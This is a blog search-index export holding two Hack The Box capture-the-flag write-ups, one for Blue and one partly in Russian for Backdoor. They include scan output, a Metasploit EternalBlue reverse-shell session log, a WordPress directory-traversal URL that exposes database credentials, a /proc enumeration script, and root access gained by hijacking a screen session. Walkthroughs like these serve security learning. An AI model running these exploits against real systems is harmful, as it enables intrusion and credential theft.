[ { "title": "HTB Machine Blue", "url": "/posts/HTB-Machine-Blue/", "categories": "writeup", "tags": "writeup, hackthebox, windows", "date": "2022-04-15 00:00:00 +0300", "snippet": "Hackthebox Blue WriteupThis is the writeup for the machine Blue from Hack the boxBox InfoEnumerationNmap scannmap -sV -sC -v -oN nmap.txt 10.129.155.247PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPC49157/tcp open msrpc Microsoft Windows RPCService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.1: |_ Message signing enabled but not required| smb2-time: | date: 2022-02-23T16:51:52|_ start_date: 2022-02-23T16:49:33| smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)| OS CPE: cpe:/o:microsoft:windows_7::sp1:professional| Computer name: haris-PC| NetBIOS computer name: HARIS-PC\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2022-02-23T16:51:50+00:00|_clock-skew: mean: 3s, deviation: 1s, median: 2sSMB└──╼ [★]$ smbclient -N -L //10.129.155.247/ \tSharename Type Comment\t--------- ---- -------\tADMIN$ Disk Remote Admin\tC$ Disk Default share\tIPC$ IPC Remote IPC\tShare Disk \tUsers Disk SMB1 disabled -- no workgroup available└──╼ [★]$ smbclient -N //10.129.155.247/Share empty└──╼ [★]$ smbclient -N //10.129.155.247/Users . DR 0 Fri Jul 21 07:56:23 2017 .. DR 0 Fri Jul 21 07:56:23 2017 Default DHR 0 Tue Jul 14 08:07:31 2009 desktop.ini AHS 174 Tue Jul 14 05:54:24 2009 Public DR 0 Tue Apr 12 08:51:29 2011Getting ShellTry to exploit ms17_010, getting shell, admin and flags :)msf6 exploit(windows/smb/ms17_010_psexec) &gt; run[*] Started reverse TCP handler on 10.10.14.6:10004 [*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1[*] 10.10.10.40:445 - Built a write-what-where primitive...[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained![*] 10.10.10.40:445 - Selecting PowerShell target[*] 10.10.10.40:445 - Executing the payload...[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...[*] Sending stage (175174 bytes) to 10.10.10.40[*] Meterpreter session 1 opened (10.10.14.6:10004 -&gt; 10.10.10.40:49158 ) at 2022-06-21 12:54:27 +0300meterpreter &gt; meterpreter &gt; sysinfoComputer : HARIS-PCOS : Windows 7 (6.1 Build 7601, Service Pack 1).Architecture : x64System Language : en_GBDomain : WORKGROUPLogged On Users : 2Meterpreter : x86/windowsmeterpreter &gt; &lt;SNIP&gt;...&lt;/SNIP&gt;meterpreter &gt; cat Desktop/user.txt7438e53faa292a66c0ca749e656790bemeterpreter &gt; cd Desktopdmeterpreter &gt; dirListing: C:\\Users\\Administrator\\Desktop=======================================Mode Size Type Last modified Name---- ---- ---- ------------- ----100666/rw-rw-rw- 282 fil 2017-07-21 09:56:40 +0300 desktop.ini100444/r--r--r-- 34 fil 2022-06-21 12:49:29 +0300 root.txtmeterpreter &gt; cat root.txt83581f86ebb44a064a21762489b3bef4" }, { "title": "HTB Machine Backdoor", "url": "/posts/HTB-Machine-Backdoor/", "categories": "writeup", "tags": "writeup, hackthebox, linux", "date": "2022-03-26 00:00:00 +0300", "snippet": "Hackthebox Backdoor WriteupBox InfoEnumerationNmap scannmap -Pn -p- -sC -sV --min-rate=256 --min-parallelism=512 -v -oN nmap-full.txt 10.10.11.125 55s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)|_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Backdoor &amp;#8211; Real-Life|_http-generator: WordPress 5.8.11337/tcp open waste?Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelport 80 - webПри переходе на сайт выскакивает ошибка Unknown host: backdoor.htb, добавим сайт в /etc/hosts хостыanalyze wordpressЗапустим wpscanнашли http://backdoor.htb/readme.htmlзаглянем в обычные папкиhttp://backdoor.htb/wp-content/themes пустая страница, доступ есть но не отображаетсяhttp://backdoor.htb/wp-content/plugins видим плагинhttp://backdoor.htb/wp-content/uploads есть доступ но файлов там нетв plugins нашли ebook-download/ версии 1.1на нее есть cve Directory Traversal https://www.exploit-db.com/exploits/39575Getting ShellDirectory TraversalExploitbackdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.phpУзнаем креды для подключенияdefine( 'DB_NAME', 'wordpress' );/** MySQL database username */define( 'DB_USER', 'wordpressuser' );/** MySQL database password */define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );Подключаемся к машинеиз /etc/passwd узнаем имя пользователя userИнформации больше нет, куда стучаться тоже непонятно.Остается неизвестный порт 1337, значит какой то процесс запущен на машинеИз узявимостей есть только Directory Traversal, можно почитать системные файлы из /proc и поискать процесс с командой выполненияв скрипте проблема, что он пишет в файл бинарно, лень разбираться как чинить, поэтому сделал через костыльstrings output.txt &gt; output_good.txt#todo закинуть в fli блок кодurl = \"http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../\"with open(\"output1.txt\", \"w\") as file:\tfor i in range(3000):\t\tresp = req.get(url + f\"proc/{i}/cmdline\")\t\t\t\ttext = resp.text.split(\"&lt;\")[0]\t\ttext = text.split(\"cmdline/\")[1] if len(text.split(\"cmdline/\")) &gt; 1 else \"\"\t\t\t\tif(text != \"\"):\t\t\tresult = f\"FIND pid {i} command: {text}\"\t\t\t\telse:\t\t\tresult = f\"pid {i} none\"\t\tprint(result)\t\tfile.writelines(f\"{result.encode('utf-8')}\\n\")потом в Sublime при помощи простого регулярного выражения меняемpid \\d{1,5} none\\n на пустоту и имеемGetting shellВидим сервис gdbserverНаходим на него RCE https://www.exploit-db.com/exploits/50539добавил себя в SSHssh-keygen -t rsacat .ssh/id_rsa.pub# скачал себе id_rsa и авторизировался по немуchmod 700 id_rsassh -i id_rsa user@backdoor.htbGetting ROOTЗапускаем linpeasПомимо всего прочего видим сессию рутасмотрим сессии screenscreen -lsподключаемся к сессии рутаscreen -X root/rootМы рут :)" } ]
